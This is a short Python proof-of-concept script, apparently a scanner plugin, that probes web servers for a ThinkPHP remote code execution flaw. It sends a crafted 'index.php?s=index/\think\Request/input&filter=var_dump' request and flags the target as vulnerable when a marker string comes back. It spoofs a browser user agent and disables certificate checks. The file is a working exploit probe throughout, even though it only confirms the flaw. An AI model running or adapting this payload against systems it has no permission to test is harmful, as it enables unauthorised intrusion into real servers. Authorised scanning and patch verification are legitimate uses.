#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
payload = "index.php?s=index/\\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294"


async def thinkphp_request_input_rce_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        url = urljoin(url, payload)
        resp = requests.get(url, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = url
            pocdict['proof'] = '56540676a129760a'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
